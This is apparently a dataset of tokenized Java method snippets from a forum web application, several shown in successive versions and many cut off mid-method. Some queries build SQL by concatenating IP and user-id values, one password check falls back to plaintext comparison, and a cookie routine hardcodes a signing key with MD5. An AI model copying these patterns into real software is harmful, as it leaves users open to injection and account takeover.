getNumFound ( ) ) ; params . put ( " time " , time ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new ModelAndView ( " search " , params ) ; } 
public static SearchViewer . SearchInterval parseInterval ( String date ) { if ( date = = null ) { return SearchViewer . DEFAULT_INTERVAL ; } return SearchViewer . SearchInterval . valueOf ( date ) ; } 
public static SearchViewer . SearchInterval parseInterval ( String date ) { if ( date = = null ) { return SearchViewer . DEFAULT_INTERVAL ; } return SearchViewer . SearchInterval . valueOf ( date . toUpperCase ( ) ) ; } 
public void optimize ( ) throws IOException , SolrServerException { logger . info ( " Optimizing solr index " ) ; solrServer . optimize ( true , true , 5 ) ; logger . info ( " Finished solr index optimization " ) ; } 
public void updateScore ( ) throws Exception { logger . info ( " Updating score " ) ; Connection db = LorDataSource . getConnection ( ) ; try { db . setAutoCommit ( false ) ; 
public ModelAndView register ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { Connection db = null ; 
public static User getUser ( Connection con , String name ) throws SQLException , UserNotFoundException { Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; User user = new User ( con , name ) ; String cacheId = " User?id= " + user . id ; cache . put ( new Element ( cacheId , user ) ) ; return user ; } 
private static User getUser ( Connection db , int id , boolean useCache ) throws SQLException , UserNotFoundException { Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; String cacheId = " User?id= " + id ; User res = null ; if ( useCache ) { Element element = cache . get ( cacheId ) ; if ( element ! = null ) { res = ( User ) element . getObjectValue ( ) ; } } if ( res = = null ) { res = new User ( db , id ) ; cache . put ( new Element ( cacheId , res ) ) ; } return res ; } 
public ModelAndView showComments ( @RequestParam String nick , @RequestParam ( defaultValue = " 0 " ) int offset , HttpServletRequest request , HttpServletResponse response ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; ModelAndView mv = new ModelAndView ( " show-comments " ) ; int topics = 50 ; mv . getModel ( ) . put ( " topics " , topics ) ; if ( offset < 0 ) { throw new ServletParameterException ( " offset<0!? " ) ; } mv . getModel ( ) . put ( " offset " , offset ) ; boolean firstPage = offset = = 0 ; if ( firstPage ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 90 * 1000 ) ; } else { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 60 * 1000L ) ; } mv . getModel ( ) . put ( " firstPage " , firstPage ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private static List < DeletedListItem > getDeletedComments ( Connection db , int userid ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as msgid, del_info.reason, deldate FROM sections, groups, topics, comments, del_info WHERE sections.id=groups.section AND groups.id=topics.groupid AND comments.topic=topics.id AND del_info.msgid=comments.id AND comments.userid= " + userid + " AND del_info.delby!= " + userid + " ORDER BY del_info.delDate DESC NULLS LAST, del_info.msgid DESC LIMIT 20; " ) ; ImmutableList . Builder < DeletedListItem > builder = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { builder . add ( new DeletedListItem ( rs ) ) ; } rs . close ( ) ; st . close ( ) ; return builder . build ( ) ; } 
public String toString ( ) { return toString ( tags ) ; } 
public static String toString ( List < String > tags ) { if ( tags = = null | | tags . isEmpty ( ) ) { return " " ; } StringBuilder str = new StringBuilder ( ) ; for ( String tag : tags ) { str . append ( str . length ( ) > 0 ? " , " : " " ) . append ( tag ) ; } return str . toString ( ) ; } 
public static SortedSet < String > getTopTags ( Connection con ) throws SQLException { SortedSet < String > set = new TreeSet < String > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values WHERE counter>1 ORDER BY counter DESC LIMIT " + TOP_TAGS_COUNT ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { set . add ( rs . getString ( " value " ) ) ; } return set ; } 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) throws SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " topTags " , Tags . getTopTags ( db ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit , @RequestParam ( value = " bonus " , required = false , defaultValue = " 3 " ) int bonus , @RequestParam ( value = " chgrp " , required = false ) Integer changeGroupId ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static SearchViewer . SearchInterval parseInterval ( String date ) { if ( date = = null ) { return SearchViewer . DEFAULT_INTERVAL ; } if ( " 3month " . equalsIgnoreCase ( date ) ) { return SearchViewer . SearchInterval . THREE_MONTH ; support for old url's } return SearchViewer.SearchInterval.valueOf(date.toUpperCase()); } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = LoginController.ACEGI_COOKIE_NAME; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
public static Map < Integer , String > getIgnoreList ( Connection db , int userid ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT a.ignored,b.nick FROM ignore_list a, users b WHERE a.userid=? AND b.id=a.ignored " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , userid ) ; ResultSet rs = pst . executeQuery ( ) ; Map < Integer , String > cignored = new HashMap < Integer , String > ( ) ; while ( rs . next ( ) ) { cignored . put ( rs . getInt ( " ignored " ) , rs . getString ( " nick " ) ) ; } return cignored ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView sameIP ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private List < TopicItem > getTopics ( Connection db , String ip ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title as title, topics.id as msgid, postdate FROM topics, groups, sections, users WHERE topics.groupid=groups.id AND sections.id=groups.section AND users.id=topics.userid AND topics.postip=' " + ip + " ' AND postdate>CURRENT_TIMESTAMP-'3 days'::interval ORDER BY msgid DESC " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs ) ) ; } rs . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getTopics ( Connection db , String ip ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title as title, topics.id as msgid, postdate " + " FROM topics, groups, sections, users " + " WHERE topics.groupid=groups.id " + " AND sections.id=groups.section " + " AND users.id=topics.userid " + " AND topics.postip=' " + ip + " ' " + " AND postdate>CURRENT_TIMESTAMP-'3 days'::interval ORDER BY msgid DESC " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs ) ) ; } rs . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getComments ( Connection db , String ip ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments " + " WHERE sections.id=groups.section " + " AND groups.id=topics.groupid " + " AND comments.topic=topics.id " + " AND comments.postip=' " + ip + " ' " + " AND comments.postdate>CURRENT_TIMESTAMP-'24 hour'::interval " + " ORDER BY postdate DESC; " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs ) ) ; } rs . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getTopics ( Connection db , String ip ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title as title, topics.id as msgid, postdate " + " FROM topics, groups, sections, users " + " WHERE topics.groupid=groups.id " + " AND sections.id=groups.section " + " AND users.id=topics.userid " + " AND topics.postip=' " + ip + " ' " + " AND postdate>CURRENT_TIMESTAMP-'3 days'::interval ORDER BY msgid DESC " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , false ) ) ; } rs . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getComments ( Connection db , String ip ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments " + " WHERE sections.id=groups.section " + " AND groups.id=topics.groupid " + " AND comments.topic=topics.id " + " AND comments.postip=' " + ip + " ' " + " AND comments.postdate>CURRENT_TIMESTAMP-'24 hour'::interval " + " ORDER BY postdate DESC; " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , true ) ) ; } rs . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getTopics ( Connection db , String ip ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title as title, topics.id as msgid, postdate " + " FROM topics, groups, sections, users " + " WHERE topics.groupid=groups.id " + " AND sections.id=groups.section " + " AND users.id=topics.userid " + " AND topics.postip=' " + ip + " ' " + " AND postdate>CURRENT_TIMESTAMP-'3 days'::interval ORDER BY msgid DESC " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , false ) ) ; } rs . close ( ) ; st . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getComments ( Connection db , String ip ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments " + " WHERE sections.id=groups.section " + " AND groups.id=topics.groupid " + " AND comments.topic=topics.id " + " AND comments.postip=' " + ip + " ' " + " AND comments.postdate>CURRENT_TIMESTAMP-'24 hour'::interval " + " ORDER BY postdate DESC; " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , true ) ) ; } rs . close ( ) ; st . close ( ) ; return res . build ( ) ; } 
private static List < UserItem > getUsers ( Connection db , String ip , int uaId ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT MAX(c.postdate) AS lastdate, u.nick, c.ua_id, ua.name AS user_agent " + " FROM comments c LEFT JOIN user_agents ua ON c.ua_id = ua.id " + " JOIN users u ON c.userid = u.id " + " WHERE c.postip=' " + ip + " ' " + " GROUP BY u.nick, c.ua_id, ua.name " + " ORDER BY MAX(c.postdate) DESC, u.nick, ua.name " ) ; ImmutableList . Builder < UserItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new UserItem ( rs , uaId ) ) ; } rs . close ( ) ; st . close ( ) ; return res . build ( ) ; } 
public boolean isSameUa ( ) { return sameUa ; } 
public ModelAndView doLogin ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( required = false ) String activation ) throws Exception { Connection db = null ; Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; boolean ajax = isAjax ( request ) ; try { db = LorDataSource . getConnection ( ) ; 
private int getUserCount ( Connection db , String email ) throws SQLException { PreparedStatement pst2 = db . prepareStatement ( " SELECT count(*) as c FROM users WHERE email=? " ) ; ResultSet rs = null ; try { pst2 . setString ( 1 , email ) ; 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) throws Exception { Connection db = null ; Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized! " ) ; } try { db = LorDataSource . getConnection ( ) ; 
private static int getUserCount ( Connection db , String email ) throws SQLException { PreparedStatement pst2 = db . prepareStatement ( " SELECT count(*) as c FROM users WHERE email=? " ) ; ResultSet rs = null ; try { pst2 . setString ( 1 , email ) ; 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized! " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public boolean isAdministrator ( ) { return candel ; } 
private static void checkView ( Message message , Template tmpl , User currentUser ) throws MessageNotFoundException { if ( tmpl . isModeratorSession ( ) ) { return ; } if ( message . isDeleted ( ) ) { if ( message . isExpired ( ) ) { 
public String resetPassword ( Connection db ) throws SQLException { String password = StringUtil . generatePassword ( ) ; PreparedStatement st = null ; try { st = db . prepareStatement ( " UPDATE users SET passwd=?,lostpwd = 'epoch' WHERE id=? " ) ; 
public ModelAndView showCodeForm ( ) { return new ModelAndView ( " reset-password-form " ) ; } 
public ModelAndView sendPassword ( @RequestParam ( " email " ) String email , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView resetPassword ( @RequestParam ( " nick " ) String nick , @RequestParam ( " code " ) String formCode , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void checkPassword ( String password ) throws BadPasswordException { if ( blocked ) { throw new BadPasswordException ( nick ) ; } if ( password = = null ) { throw new BadPasswordException ( nick ) ; } if ( ! matchPassword ( password ) ) { throw new BadPasswordException ( nick ) ; 
public boolean matchPassword ( String password ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; if ( encryptor . checkPassword ( password , this . password ) ) { return true ; } return password . equals ( this . password ) ; } 
public String resetPassword ( Connection db ) throws SQLException { String password = StringUtil . generatePassword ( ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String encryptedPassword = encryptor . encryptPassword ( password ) ; PreparedStatement st = null ; try { st = db . prepareStatement ( " UPDATE users SET passwd=?,lostpwd = 'epoch' WHERE id=? " ) ; 
public boolean matchPassword ( String password ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; try { if ( encryptor . checkPassword ( password , this . password ) ) { return true ; } } catch ( EncryptionOperationNotPossibleException ex ) { return password . equals ( this . password ) ; } return password . equals ( this . password ) ; } 
public boolean isPlainPassword ( String password ) { return password . equals ( this . password ) ; } 
public String resetPassword ( Connection db ) throws SQLException { String password = StringUtil . generatePassword ( ) ; setPassword ( db , password ) ; return password ; } 
public void setPassword ( Connection db , String password ) throws SQLException { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String encryptedPassword = encryptor . encryptPassword ( password ) ; PreparedStatement st = null ; try { st = db . prepareStatement ( " UPDATE users SET passwd=?,lostpwd = 'epoch' WHERE id=? " ) ; 
public static String escapeHtmlBBcode ( String content ) { \r".toCharArray(), new String[]{ : "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;", "[code-br]", ""}); return content; } 
public ModelAndView modifyGroup ( @RequestParam ( " group " ) int id , @RequestParam ( " title " ) String title , @RequestParam ( " info " ) String info , @RequestParam ( " urlName " ) String urlName , @RequestParam ( " longinfo " ) String longInfo , @RequestParam ( value = " preview " , required = false ) String preview , @RequestParam ( value = " resolvable " , required = false ) String resolvable , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = dataSource . getConnection ( ) ; 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , defaultValue = " false " ) boolean usertopic ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; SearchViewer . SearchInterval date = parseInterval ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setInterval ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; List < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long time = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " time " , time ) ; } finally { JdbcUtils . closeConnection ( db ) ; } } return new ModelAndView ( " search " , params ) ; } 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " highlight " , required = false ) Set < Integer > highlight ) throws Exception { return getMessageNew ( Section . SECTION_POLLS , 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewForumPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewNewsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewPollsPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewGalleryPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , page , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNew ( int section , WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , int page , String filter , String groupName , int msgid , Set < Integer > highlight ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public String getIP ( String name ) throws ServletParameterException { String ip = getString ( name ) ; if ( ! ipRE . matcher ( ip ) . matches ( ) ) { throw new ServletParameterBadValueException ( name , " not ip " ) ; } return ip ; } 
private static void check ( String domain , String msgid ) throws StorageException { if ( ! DOMAIN_CHECK_RE . matcher ( domain ) . matches ( ) ) { throw new StorageBadDomainException ( domain ) ; } if ( ! NAME_CHECK_RE . matcher ( msgid ) . matches ( ) ) { throw new StorageBadMsgidException ( msgid ) ; 
public static boolean checkLoginName ( String login ) { login = login . toLowerCase ( ) ; no zerosize login if (login.length() == 0) { return false; } if (login.length() >= 80) { return false; } return loginCheckRE.matcher(login).matches(); } 
public static boolean isUrl ( String x ) { return isUrl . matcher ( x ) . matches ( ) ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView encodePasswords ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = LorDataSource . getConnection ( ) ; try { db . setAutoCommit ( false ) ; 
public boolean matchPassword ( String password ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; try { return encryptor . checkPassword ( password , this . password ) ; 
public void checkPassword ( String password ) throws BadPasswordException { if ( blocked ) { throw new BadPasswordException ( nick ) ; } if ( password = = null ) { throw new BadPasswordException ( nick ) ; } if ( anonymous & & password . isEmpty ( ) ) { return ; } if ( ! matchPassword ( password ) ) { throw new BadPasswordException ( nick ) ; 
public boolean isCommentsAllowed ( User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( deleted | | expired ) { return false ; } int score = getPostScore ( ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . canModerate ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } if ( score = = POSTSCORE_MOD_AUTHOR ) { return user . getId ( ) = = userid ; } return user . getScore ( ) > = score ; } 
public ModelAndView modifyTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam int postscore , @RequestParam ( required = false ) Boolean sticky , @RequestParam ( required = false ) Boolean notop ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } if ( sticky = = null ) { sticky = false ; } if ( notop = = null ) { notop = false ; } if ( postscore < Message . POSTSCORE_UNRESTRICTED ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_UNRESTRICTED & & postscore < Message . POSTSCORE_REGISTERED_ONLY ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_MODERATORS_ONLY ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private static List < TopicItem > getTopics ( Connection db , String ip ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title as title, topics.id as msgid, postdate, deleted " + " FROM topics, groups, sections, users " + " WHERE topics.groupid=groups.id " + " AND sections.id=groups.section " + " AND users.id=topics.userid " + " AND topics.postip=' " + ip + " ' " + " AND postdate>CURRENT_TIMESTAMP-'3 days'::interval ORDER BY msgid DESC " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , false ) ) ; } rs . close ( ) ; st . close ( ) ; return res . build ( ) ; } 
private static List < TopicItem > getComments ( Connection db , String ip ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate, comments.deleted " + " FROM sections, groups, topics, comments " + " WHERE sections.id=groups.section " + " AND groups.id=topics.groupid " + " AND comments.topic=topics.id " + " AND comments.postip=' " + ip + " ' " + " AND comments.postdate>CURRENT_TIMESTAMP-'24 hour'::interval " + " ORDER BY postdate DESC; " ) ; ImmutableList . Builder < TopicItem > res = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { res . add ( new TopicItem ( rs , true ) ) ; } rs . close ( ) ; st . close ( ) ; return res . build ( ) ; } 
public boolean isDeleted ( ) { return deleted ; } 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) throws Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . toString ( offset ) ) ; } if ( year ! = null & & month ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . toString ( year ) + '/' + Integer . toString ( month ) ) ; } if ( groupId ! = null ) { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; Group group = new Group ( db , groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + '/' ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit , @RequestParam ( value = " bonus " , required = false , defaultValue = " 3 " ) int bonus , @RequestParam ( value = " chgrp " , required = false ) Integer changeGroupId , @RequestParam ( value = " minor " , required = false ) Boolean minor ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView modifyTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam int postscore , @RequestParam ( defaultValue = " false " ) boolean sticky , @RequestParam ( defaultValue = " false " ) boolean notop , @RequestParam ( defaultValue = " false " ) boolean minor ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } if ( postscore < Message . POSTSCORE_UNRESTRICTED ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_UNRESTRICTED & & postscore < Message . POSTSCORE_REGISTERED_ONLY ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } if ( postscore > Message . POSTSCORE_MODERATORS_ONLY ) { throw new UserErrorException ( " invalid postscore " + postscore ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showController ( @RequestParam ( " msgid " ) int msgid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
